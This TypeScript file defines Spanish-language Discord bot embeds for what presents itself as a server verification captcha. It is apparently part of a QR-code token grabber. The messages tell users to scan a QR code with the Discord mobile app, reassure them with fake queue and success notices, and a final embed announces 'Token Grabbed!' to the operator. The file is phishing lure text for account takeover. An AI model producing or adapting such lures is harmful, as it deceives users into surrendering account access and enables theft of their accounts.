import { EmbedBuilder } from "@discordjs/builders";
import { config } from "./config";

class EmbedColours {
  public static readonly colours = {
    fail: 0xff2222,
    yellow: 0xffd500,
    custom: parseInt(config.colour, 16),
  };
}

export const directMessageEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle("Captcha de verificación")
    .setDescription(
      "¡Escanee el código QR a continuación usando la aplicación móvil Discord para verificar su identidad dentro del servidor! Obtendrá acceso a todos los canales una vez que se haya verificado."
    );
  return embed;
};

export const verifyMessageEmbed = async () => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle(`${config.name} ¡Verificación requerida!`)
    .setDescription(
      `🔔 **Para acceder al servidor, primero debe pasar la verificación.**\n➡️ Presione el botón Verificar a continuación.`
    );

  return embed;
};

export const afterButtonPressEmbed = async (
  channelId: string
): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle(`Inicio de verificación`)
    .setDescription(
      `La verificación ha comenzado, continúa en tus mensajes directos [aquí](https://discord.com/channels/@me/${channelId})!`
    );

  return embed;
};

export const prepareVerificationEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle("Preparación de la verificación")
    .setDescription(
      "Espere mientras preparamos su verificación. Esto puede tardar unos pocos segundos."
    );

  return embed;
};

export const pleaseWaitEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.yellow)
    .setTitle("Casi llegamos!")
    .setDescription(
      "¡Hemos notado que usted y estamos trabajando duro para verificarlo! La cola está bastante llena en este momento, así que espere mientras completamos su verificación. Esto puede tardar unos pocos segundos."
    );

  return embed;
};

export const failedVerificationEmbed = async () => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.fail)
    .setTitle(`Fallo en la verificación`)
    .setDescription(
      `Ocurrió un error al intentar verificarte. Por favor, inténtelo de nuevo más tarde.`
    );

  return embed;
};

export const failedToMessageEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.fail)
    .setTitle("Fallo en la verificación")
    .setDescription(
      "No pude enviarte un mensaje. Comprueba tu configuración de privacidad e inténtalo de nuevo.."
    );

  return embed;
};

export const alreadyVerifyingEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.fail)
    .setTitle("Fallo en la verificación")
    .setDescription(
      "Ya estás en el proceso de verificación. Complete esto antes de volver a intentarlo."
    );

  return embed;
};

export const verificationComplete = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle("Verificación completa")
    .setDescription(
      "Te has verificado con éxito. Ahora obtendrá acceso a todos los canales dentro del servidor.."
    );

  return embed;
};

export const setRoleEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle("Conjunto de funciones de verificación")
    .setDescription(
      "Se ha establecido el rol de verificación. Los miembros ahora recibirán este rol una vez que se hayan verificado a sí mismos."
    );

  return embed;
};

export const roleIsAboveMeEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.fail)
    .setTitle("No se pudo establecer el rol")
    .setDescription(
      "El rol que ha seleccionado está por encima de mi rol más alto. Seleccione un rol debajo de mi rol más alto."
    );

  return embed;
};

export const lackPermissionsEmebd = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.fail)
    .setTitle("Permisos no válidos")
    .setDescription(
      "No tiene los permisos correctos para ejecutar este comando. Póngase en contacto con un administrador del servidor."
    );

  return embed;
};

export const foundTokenEmbed = async (): Promise<EmbedBuilder> => {
  const embed = new EmbedBuilder()
    .setColor(EmbedColours.colours.custom)
    .setTitle("Token Grabbed! Por favor revise toda la información a continuación.");

  return embed;
};
